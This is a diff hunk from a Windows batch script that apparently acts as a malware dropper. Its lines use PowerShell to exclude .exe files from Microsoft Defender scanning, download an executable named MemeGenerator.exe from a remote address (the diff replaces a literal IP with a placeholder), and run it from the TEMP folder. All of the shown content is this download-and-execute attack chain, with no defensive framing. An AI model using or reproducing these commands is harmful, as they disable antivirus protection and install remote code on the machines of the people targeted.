@@ -30,7 +30,7 @@ if '%errorlevel%' NEQ '0' (
 :--------------------------------------
 Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'http://192.168.74.148/MemeGenerator.exe' -OutFile MemeGenerator.exe"
+Powershell -Command "Invoke-Webrequest 'http://<IP_ADDRESS>/MemeGenerator.exe' -OutFile MemeGenerator.exe"
 MemeGenerator.exe
 :--------------------------------------
 
